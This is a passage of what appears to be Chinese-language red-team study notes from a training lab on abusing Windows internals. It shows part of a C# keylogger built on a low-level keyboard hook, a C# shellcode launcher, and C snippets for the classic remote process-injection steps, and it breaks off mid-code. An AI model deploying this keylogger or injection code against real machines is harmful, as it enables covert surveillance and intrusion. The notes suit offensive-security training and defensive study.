style="color: #E06C75">curModule</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">curProcess</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">MainModule</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #ABB2BF">        {</span></span><span class="line"><span style="color: #7F848E; font-style: italic">            // SetWindowsHookEx 函数将我们的回调函数注册为钩子</span></span><span class="line"><span style="color: #ABB2BF">            </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">SetWindowsHookEx</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">WH_KEYBOARD_LL</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">proc</span><span style="color: #ABB2BF">, </span><span style="color: #61AFEF">GetModuleHandle</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">curModule</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">ModuleName</span><span style="color: #ABB2BF">), </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">        }</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">    // 钩子的回调函数，当有键盘事件发生时，Windows 会调用此函数</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">HookCallback</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">nCode</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">wParam</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">lParam</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #ABB2BF">    {</span></span><span class="line"><span style="color: #7F848E; font-style: italic">        // 如果 nCode 小于 0，不处理消息</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #E06C75">nCode</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">&gt;=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #ABB2BF">        {</span></span><span class="line"><span style="color: #7F848E; font-style: italic">            // 检查按键是否被按下</span></span><span class="line"><span style="color: #ABB2BF">            </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #E06C75">wParam</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">==</span><span style="color: #ABB2BF"> (</span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF">)</span><span style="color: #E06C75">WM_KEYDOWN</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">||</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">wParam</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">==</span><span style="color: #ABB2BF"> (</span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF">)</span><span style="color: #E06C75">WM_SYSKEYDOWN</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #ABB2BF">            {</span></span><span class="line"><span style="color: #7F848E; font-style: italic">                // 获取虚拟键码</span></span><span class="line"><span style="color: #ABB2BF">                </span><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">vkCode</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Marshal</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">ReadInt32</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">lParam</span><span style="color: #ABB2BF">);</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">                // 将虚拟键码转换为 C# 的 Keys 枚举</span></span><span class="line"><span style="color: #ABB2BF">                </span><span style="color: #E5C07B">Keys</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">key</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> (</span><span style="color: #E5C07B">Keys</span><span style="color: #ABB2BF">)</span><span style="color: #E06C75">vkCode</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">                // 判断按键是否是字母</span></span><span class="line"><span style="color: #ABB2BF">                </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #E06C75">key</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">&gt;=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Keys</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">A</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">&amp;&amp;</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">key</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">&lt;=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Keys</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Z</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #ABB2BF">                {</span></span><span class="line"><span style="color: #7F848E; font-style: italic">                    // 如果是字母，转换为小写并直接写入文件，不换行</span></span><span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #E5C07B">logWriter</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">Write</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">key</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">ToString</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">ToLower</span><span style="color: #ABB2BF">());</span></span><span class="line"><span style="color: #ABB2BF">                }</span></span><span class="line"><span style="color: #ABB2BF">                </span><span style="color: #C678DD">else</span></span><span class="line"><span style="color: #ABB2BF">                {</span></span><span class="line"><span style="color: #7F848E; font-style: italic">                    // 如果是其他按键，将按键名称（用 [] 括起来）写入文件并换行</span></span><span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #E5C07B">logWriter</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">WriteLine</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">$&quot; [{</span><span style="color: #E5C07B">key</span><span style="color: #98C379">.</span><span style="color: #61AFEF">ToString</span><span style="color: #98C379">()}]&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">                }</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">                // 确保内容立即写入文件，防止数据丢失</span></span><span class="line"><span style="color: #ABB2BF">                </span><span style="color: #E5C07B">logWriter</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">Flush</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #ABB2BF">            }</span></span><span class="line"><span style="color: #ABB2BF">        }</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">CallNextHookEx</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">_hookID</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">nCode</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">wParam</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">lParam</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">    // 将消息传递给 Hook 链中的下一个钩子</span></span><span class="line"><span style="color: #ABB2BF">    [</span><span style="color: #E5C07B">DllImport</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;user32.dll&quot;</span><span style="color: #ABB2BF">, CharSet </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">CharSet</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Auto</span><span style="color: #ABB2BF">, SetLastError </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">)]</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">extern</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">CallNextHookEx</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">hhk</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">nCode</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">wParam</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">lParam</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><h3 id="Shellcode-Launcher"><a href="#Shellcode-Launcher" class="headerlink" title="Shellcode Launcher"></a>Shellcode Launcher</h3><p>Shellcode 加载器的 P&#x2F;Invoke 过程：</p><figure class="shiki csharp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">MEM_COMMIT</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0x1000</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">PAGE_EXECUTE_READWRITE</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0x40</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">[</span><span style="color: #E5C07B">DllImport</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;kernel32&quot;</span><span style="color: #ABB2BF">)]</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// 调用进程的虚拟地址空间中分配、保留或提交内存区域</span></span><span class="line"><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">extern</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">VirtualAlloc</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">lpStartAddr</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">size</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">flAllocationType</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">flProtect</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">[</span><span style="color: #E5C07B">DllImport</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;kernel32&quot;</span><span style="color: #ABB2BF">)]</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// 等待一个内核对象，直到该对象进入有信号状态或者指定的超时时间已到</span></span><span class="line"><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">extern</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">WaitForSingleObject</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">hHandle</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">dwMilliseconds</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">[</span><span style="color: #E5C07B">DllImport</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;kernel32&quot;</span><span style="color: #ABB2BF">)]</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// 在当前进程的虚拟地址空间内创建一个新的线程来执行一个指定的函数</span></span><span class="line"><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">extern</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">CreateThread</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">lpThreadAttributes</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">dwStackSize</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">lpStartAddress</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">param</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">dwCreationFlags</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">ref</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">lpThreadId</span><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure><p>Shellcode 加载器的具体过程：</p><figure class="shiki csharp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">// 1分配一个可以容纳 shellcode 大小的内存区域，并且立即提交并且赋予可执行和读写权限</span></span><span class="line"><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">funcAddr</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">VirtualAlloc</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, (</span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF">)</span><span style="color: #E5C07B">shellcode</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Length</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">MEM_COMMIT</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">PAGE_EXECUTE_READWRITE</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// 把 shellcode 复制到这个内存区域</span></span><span class="line"><span style="color: #E5C07B">Marshal</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">Copy</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">shellcode</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, (</span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF">)(</span><span style="color: #E06C75">funcAddr</span><span style="color: #ABB2BF">), </span><span style="color: #E5C07B">shellcode</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Length</span><span style="color: #ABB2BF">);</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">// 2初始化句柄，线程 ID，线程参数</span></span><span class="line"><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">hThread</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Zero</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">threadId</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// 指向线程参数的指针，这里为空</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// 也可以在下面的那个调用里面直接传一个 IntPtr.Zero</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// 但是上面两个是必须的，函数创建之后会把线程句柄和线程 ID 写回</span></span><span class="line"><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">pinfo</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Zero</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">// 3创建一个新线程来执行 shellcode</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// CreateThread 是一个 Win32 API 函数，它在新线程中执行一个函数（这里是我们的 shellcode）</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// 参数依次为：线程安全属性、栈大小、线程起始地址、线程参数、创建标志、线程 ID</span></span><span class="line"><span style="color: #E06C75">hThread</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">CreateThread</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">funcAddr</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">pinfo</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">ref</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">threadId</span><span style="color: #ABB2BF">);</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">// 4等待线程执行完成</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// WaitForSingleObject 是一个 Win32 API 函数，用于等待一个对象（这里是我们的线程）进入有信号状态或超时</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// 0xFFFFFFFF 代表无限等待，直到线程执行完毕</span></span><span class="line"><span style="color: #61AFEF">WaitForSingleObject</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">hThread</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0xFFFFFFFF</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #C678DD">return</span><span style="color: #ABB2BF">;</span></span></code></pre></div></div></figure><h1 id="Abusing-Windows-Internals"><a href="#Abusing-Windows-Internals" class="headerlink" title="Abusing Windows Internals"></a>Abusing Windows Internals</h1><p>“Windows 内部”一词可涵盖 Windows 操作系统后端的所有组件。这包括进程、文件格式、COM（组件对象模型）、任务调度、I&#x2F;O 系统等。本房间将重点介绍如何滥用和利用进程及其组件、DLL（动态链接库）和 PE（可执行文件）格式。</p><h2 id="Abusing-Processes-滥用进程"><a href="#Abusing-Processes-滥用进程" class="headerlink" title="Abusing Processes 滥用进程"></a>Abusing Processes 滥用进程</h2><p>一个应用程序可以包含一个或者多个进程，而一个进程有多个子组件，他们可以直接和内存或虚拟内存交互，下面是每个进程的关键组件和用途，前面的 Windows Internals 房间我已经介绍过了，这里直接复制过来了。</p><table><thead><tr><th>进程组件</th><th>作用</th></tr></thead><tbody><tr><td>私有虚拟内存空间</td><td>分配给进程的虚拟内存地址</td></tr><tr><td>可执行程序</td><td>定义存储在虚拟内存空间中的代码和数据</td></tr><tr><td>打开的句柄</td><td>定义进程可访问的系统资源的句柄</td></tr><tr><td>安全上下文</td><td>访问令牌定义了用户， 安全组，权限和其他安全信息</td></tr><tr><td>进程 ID</td><td>每个进程独有的数字标识符</td></tr><tr><td>线程</td><td>进程计划执行的部分</td></tr></tbody></table><p>进程注入通常是一个总括性术语，用于描述通过合法功能或组件将恶意代码注入进程。在本房间中，我们将重点关注以下四种不同类型的进程注入。</p><table><thead><tr><th><strong>Injection Type</strong></th><th><strong>Function</strong></th></tr></thead><tbody><tr><td><a href="https://attack.mitre.org/techniques/T1055/012/">Process Hollowing</a> 进程挖空</td><td>把代码注入进暂停并且挖空的进程中</td></tr><tr><td><a href="https://attack.mitre.org/techniques/T1055/003/">Thread Execution Hijacking</a> 线程执行劫持</td><td>把代码注入进暂停的线程中</td></tr><tr><td><a href="https://attack.mitre.org/techniques/T1055/001/">Dynamic-link Library Injection</a> 动态链接库注入</td><td>把 DLL 注入进正在运行的进程中</td></tr><tr><td><a href="https://attack.mitre.org/techniques/T1055/002/">Portable Executable Injection</a> 可执行文件注入</td><td>将指向恶意函数的 PE 镜像自注入到目标进程中</td></tr></tbody></table><p><a href="https://attack.mitre.org/techniques/T1055/">MITRE T1055</a> 中概述了许多其他形式的进程注入。</p><p>最基本的进程注入形式是 shellcode 注入，可以分为四个步骤：</p><ol><li>以所有访问权限打开目标进程。</li><li>为 shellcode 分配目标进程内存。</li><li>将 shellcode 写入目标进程中已分配的内存。</li><li>使用远程线程执行 shellcode。</li></ol><p>这些步骤也可以用图表形式分解，以描绘 Windows API 调用如何与进程内存交互。</p><img src="/thm_rthe/ba04c5ef220c10b3e174bd1ca77959c6.png" class="" title="img"><p>这里会分解一个 Shellcode 注入器的执行过程，这里和我们之前玩的注入一个弹窗是一样的。</p><p>第一步，用 <code>OpenProcess</code> 打开目标进程：</p><figure class="shiki c"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">processHandle </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">OpenProcess</span><span style="color: #ABB2BF">(</span></span><span class="line"><span style="color: #E06C75">PROCESS_ALL_ACCESS</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // Defines access rights</span></span><span class="line"><span style="color: #E06C75"></span><span style="color: #D19A66">FALSE</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // Target handle will not be inhereted</span></span><span class="line"><span style="color: #E06C75"></span><span style="color: #61AFEF">DWORD</span><span style="color: #ABB2BF">(</span><span style="color: #61AFEF">atoi</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">argv[</span><span style="color: #D19A66">1</span><span style="color: #E06C75">]</span><span style="color: #ABB2BF">))</span><span style="color: #7F848E; font-style: italic"> // Local process supplied by command-line arguments </span></span><span class="line"><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure><p>第二步，分配内存：</p><figure class="shiki c"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">remoteBuffer </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">VirtualAllocEx</span><span style="color: #ABB2BF">(</span></span><span class="line"><span style="color: #E06C75">processHandle</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // Opened target process</span></span><span class="line"><span style="color: #E06C75"></span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span></span><span class="line"><span style="color: #E06C75"></span><span style="color: #C678DD">sizeof</span><span style="color: #E06C75"> </span><span style="color: #E06C75; font-style: italic">shellcode</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // Region size of memory allocation</span></span><span class="line"><span style="color: #E06C75"></span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">MEM_RESERVE </span><span style="color: #C678DD">|</span><span style="color: #E06C75"> MEM_COMMIT</span><span style="color: #ABB2BF">),</span><span style="color: #7F848E; font-style: italic"> // Reserves and commits pages</span></span><span class="line"><span style="color: #E06C75">PAGE_EXECUTE_READWRITE</span><span style="color: #7F848E; font-style: italic"> // Enables execution and read/write access to the commited pages</span></span><span class="line"><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure><p>第三步，写入 shellcode 到分配好的内存区域中：</p><figure class="shiki c"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">WriteProcessMemory</span><span style="color: #ABB2BF">(</span></span><span class="line"><span style="color: #E06C75">processHandle</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // Opened target process</span></span><span class="line"><span style="color: #E06C75">remoteBuffer</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // Allocated memory region</span></span><span class="line"><span style="color: #E06C75">shellcode</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // Data to write</span></span><span class="line"><span style="color: #E06C75"></span><span style="color: #C678DD">sizeof</span><span style="color: #E06C75"> </span><span style="color: #E06C75; font-style: italic">shellcode</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // byte size of data</span></span><span class="line"><span style="color: #E06C75"></span><span style="color: #D19A66">NULL</span></span><span class="line"><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure><p>第四步，用 <code>CreateRemoteThread</code> 执行：</p><figure class="shiki c"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">remoteThread </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">CreateRemoteThread</span><span style="color: #ABB2BF">(</span></span><span class="line"><span style="color: #E06C75">processHandle</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // Opened target process</span></span><span class="line"><span style="color: #E06C75"></span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span></span><span class="line"><span style="color: #E06C75"></span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // Default size of the stack</span></span><span class="line"><span style="color: #E06C75"></span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">LPTHREAD_START_ROUTINE</span><span style="color: #ABB2BF">)</span><span style="color: #E06C75; font-style: italic">remoteBuffer</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // Pointer to the starting address of the thread</span></span><span class="line"><span style="color: #E06C75"></span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span></span><span class="line"><span style="color: #E06C75"></span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // Ran immediately after creation</span></span><span class="line"><span style="color: #E06C75"></span><span style="color: #D19A66">NULL</span></span><span class="line"><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure><h3 id="远程代码注入实战"><a href="#远程代码注入实战" class="headerlink" title="远程代码注入实战"></a>远程代码注入实战</h3><p>这里的 Shellcode 是弹计算器的，执行会被卡巴拦未授权的注入。</p><style>.ooznqsmvrqem{zoom:33%;}</style><img onerror="imgOnError(this);" data-fancybox="gallery" src="/thm_rthe/image-20250822023032418.png" class="ooznqsmvrqem" alt="image-20250822023032418" data-caption="image-20250822023032418" loading="lazy"><figure class="shiki c"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 